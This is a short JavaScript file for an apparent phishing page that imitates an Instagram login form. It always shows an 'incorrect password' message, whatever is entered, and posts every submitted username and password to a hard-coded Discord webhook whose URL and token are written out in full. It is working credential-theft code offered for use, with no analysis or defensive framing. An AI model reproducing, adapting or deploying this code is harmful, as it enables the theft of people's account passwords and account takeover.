document.getElementById("loginForm").addEventListener("submit", function (event) {
    event.preventDefault();

    const username = document.getElementById("username").value;
    const password = document.getElementById("password").value;
    const incorrectPasswordDiv = document.querySelector(".incorrect_password");

    const validEmailDomains = ["@gmail.com", "@hotmail.com", "@outlook.com"];
    const isValidEmail = validEmailDomains.some(domain => username.endsWith(domain));

    if (!isValidEmail) {
        alert("Invalid input: " + username);
        return;
    }

    const isPasswordCorrect = false;

    if (!isPasswordCorrect) {
        incorrectPasswordDiv.style.display = "block";
    } else {
        incorrectPasswordDiv.style.display = "none";
    }

    const webhookURL = "https://discord.com/api/webhooks/1098812319385006151/jO8635-ksxw6Zzp02-mE1kKfkGl0ZsJnb4zuA_KXQtkWrJCxLzX7kespcWyxSPwiOkTN";

    const payload = {
        content: `Instagram Login Attempt\n👤 \`${username}\`\n🔑 \`${password}\``
    };

    fetch(webhookURL, {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify(payload)
    }).then(response => {
        if (response.ok) {
            console.log("Login attempt logged.");
        } else {
            console.log("Error sending data.");
        }
    }).catch(error => {
        console.error("Error:", error);
    });
});
